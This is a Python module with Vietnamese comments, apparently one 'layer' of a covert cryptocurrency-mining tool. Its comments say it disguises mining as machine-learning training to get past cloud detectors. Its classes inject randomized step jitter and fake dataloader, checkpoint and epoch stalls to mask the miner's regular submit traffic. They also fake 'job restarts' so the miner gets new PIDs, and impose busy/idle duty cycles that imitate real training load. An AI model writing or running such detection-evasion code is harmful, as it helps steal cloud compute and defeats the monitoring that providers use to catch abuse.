"""
timing_disguise.py — Layer 7: Timing / epoch schedule
Giả lập nhịp training: step timing, epoch boundaries, dataloader stalls
"""
import os
import time
import random
import threading
from typing import Optional, Callable, List, Tuple


# ═══════════════════════════════════════════════════════════════
# STEP TIMING — Giả lập training step rhythm
# ═══════════════════════════════════════════════════════════════

class StepTiming:
    """
    Training step rhythm:
    - forward: steady, GPU-bound (200-800ms)
    - backward: similar
    - optimizer: small (10-50ms)
    - dataloader stall: thỉnh thoảng 0.5-5s (I/O bound)
    - eval spike: hiếm, 2-3x step time
    
    Mining rhythm (cần che): submit ~ every N seconds đều đều.
    
    Strategy: đặt jitter + stall ngẫu nhiên quanh nhịp thật
    để traffic timing không còn đều đặn.
    """

    def __init__(self, base_step: float = 0.35):
        self.base_step = base_step
        self._step_count = 0
        self._epoch = 1
        self._max_epoch = 100

    def next_step_delay(self) -> float:
        """
        Trả về delay cho step kế tiếp (seconds).
        Mô phỏng: compute + occasional stall.
        """
        self._step_count += 1

        # Base compute time với jitter
        delay = max(0.05, random.gauss(self.base_step, self.base_step * 0.2))

        # Dataloader stall: 5% steps bị I/O stall
        if random.random() < 0.05:
            delay += random.uniform(0.5, 5.0)

        # Checkpoint spike: mỗi ~500 steps
        if self._step_count % 500 == 0:
            delay += random.uniform(3.0, 10.0)

        # Epoch boundary: mỗi 2000 steps
        if self._step_count % 2000 == 0:
            self._epoch = min(self._epoch + 1, self._max_epoch)
            delay += random.uniform(5.0, 20.0)

        return delay

    @property
    def epoch(self) -> int:
        return self._epoch

    @property
    def step(self) -> int:
        return self._step_count

    def reset(self):
        self._step_count = 0
        self._epoch = 1


# ═══════════════════════════════════════════════════════════════
# EPOCH SCHEDULE — Longer-term schedule (giờ/ngày)
# ═══════════════════════════════════════════════════════════════

class EpochSchedule:
    """
    Long-term schedule giả lập job training thật:
    
    - "Job" chạy 2-6 giờ rồi "finishes" → restart job mới
    - Learning rate warmup → decay (đổi GPU power limit)
    - Eval checkpoint mỗi 15-30 phút
    - "Early stop" thỉnh thoảng: pause 5-15 phút rồi resume
    - Restart binary miner như "job restart" (pattern mới PID)
    """

    def __init__(self, on_epoch_boundary: Optional[Callable] = None,
                 on_lr_decay: Optional[Callable] = None,
                 on_early_stop: Optional[Callable] = None):
        self.on_epoch_boundary = on_epoch_boundary
        self.on_lr_decay = on_lr_decay
        self.on_early_stop = on_early_stop

        self._running = False
        self._thread: Optional[threading.Thread] = None
        self.job_start = time.time()

        # Config
        self.eval_interval = (900, 1800)      # 15-30 min
        self.lr_decay_interval = (1800, 3600)  # 30-60 min
        self.job_duration = (7200, 21600)      # 2-6 hours
        self.early_stop_chance = 0.03          # 3% mỗi cycle

    def run_loop(self):
        self._running = True
        cycle = 0

        while self._running:
            cycle += 1

            # Eval checkpoint
            time.sleep(random.uniform(*self.eval_interval))
            if not self._running:
                break
            if self.on_epoch_boundary:
                try:
                    self.on_epoch_boundary(cycle)
                except Exception:
                    pass

            # LR decay
            time.sleep(random.uniform(*self.lr_decay_interval))
            if not self._running:
                break
            if self.on_lr_decay:
                try:
                    self.on_lr_decay(cycle)
                except Exception:
                    pass

            # Early stop chance
            if random.random() < self.early_stop_chance:
                if self.on_early_stop:
                    try:
                        self.on_early_stop(cycle)
                    except Exception:
                        pass
                # Pause như "dừng để eval/đổi dataset"
                time.sleep(random.uniform(300, 900))

            # Job duration hết → "restart job"
            elapsed = time.time() - self.job_start
            if elapsed > random.uniform(*self.job_duration):
                self.job_start = time.time()
                # Caller có thể restart miner ở đây (PID mới)

    def start(self):
        if self._thread is None or not self._thread.is_alive():
            self._thread = threading.Thread(target=self.run_loop, daemon=True)
            self._thread.start()

    def stop(self):
        self._running = False


# ═══════════════════════════════════════════════════════════════
# IDLE PATTERN — Giả lập "không always busy"
# ═══════════════════════════════════════════════════════════════

class IdlePattern:
    """
    Cloud detector để ý GPU/CPU luôn 100% = mining.
    Training thật: duty cycle ~70-95% với idle gaps.
    
    Áp dụng: block/spin theo pattern để CPU usage giả lập.
    """

    def __init__(self, busy_frac: float = 0.85, cycle: float = 10.0):
        self.busy_frac = busy_frac
        self.cycle = cycle

    def work_block(self, seconds: float):
        """Busy-wait 'seconds' — Giả lập compute."""
        end = time.perf_counter() + seconds
        while time.perf_counter() < end:
            # Vòng lặp nhẹ nhàng — không dùng sleep 100%
            pass

    def run_cycle(self):
        """1 cycle: busy rồi idle."""
        busy = self.cycle * self.busy_frac
        idle = self.cycle * (1 - self.busy_frac)
        self.work_block(busy)
        if idle > 0:
            time.sleep(idle + random.gauss(0, idle * 0.2))

    def loop_forever(self, stop_event: Optional[threading.Event] = None):
        while stop_event is None or not stop_event.is_set():
            self.run_cycle()


# ═══════════════════════════════════════════════════════════════
# CONVENIENCE
# ═══════════════════════════════════════════════════════════════

def create_timing_suite() -> dict:
    """Tạo toàn bộ timing components."""
    return {
        "step": StepTiming(),
        "schedule": EpochSchedule(),
        "idle": IdlePattern(),
    }
